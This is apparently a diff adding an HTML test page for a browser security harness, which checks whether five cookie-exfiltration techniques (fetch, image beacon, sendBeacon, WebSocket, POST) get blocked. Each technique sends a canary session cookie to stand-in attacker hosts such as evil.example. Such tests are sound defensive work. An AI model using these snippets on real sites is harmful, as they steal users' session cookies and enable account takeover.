@@ -1,0 +1,13 @@
+<!doctype html><html lang="lo"><meta charset="utf-8"><title>ກະຕ່າ</title><script src="rt.js"></script>
+<h1>ກະຕ່າສິນຄ້າ</h1><p>Attack: send cookies to an attacker server, five different ways.</p>
+<script>
+document.cookie = 'session=CANARY-7f3a9; path=/';
+const c = encodeURIComponent(document.cookie);
+rtDone([
+  rt('fetch https://exfil.glyphsweep-canary.net/c (no-cors)', () => fetch('https://exfil.glyphsweep-canary.net/c?' + c, { mode: 'no-cors' }).then((r) => 'opaque ' + r.type)),
+  rt('image beacon http://evil.example/p.gif', () => new Promise((ok, bad) => { const i = new Image(); i.onload = () => ok('loaded'); i.onerror = () => bad(new Error('image blocked')); i.src = 'http://evil.example/p.gif?c=' + c; })),
+  rt('navigator.sendBeacon http://evil.example/b', () => { const q = navigator.sendBeacon('http://evil.example/b', c); return new Promise((ok, bad) => setTimeout(() => bad(new Error('queued=' + q + '; verdict from proxy log')), 1500)); }),
+  rt('WebSocket wss://evil.example/ws', () => new Promise((ok, bad) => { const w = new WebSocket('wss://evil.example/ws'); w.onopen = () => ok('open'); w.onerror = () => bad(new Error('websocket refused')); })),
+  rt('POST http://evil.example/steal', () => fetch('http://evil.example/steal', { method: 'POST', body: c }).then(viaProxy)),
+]);
+</script></html>
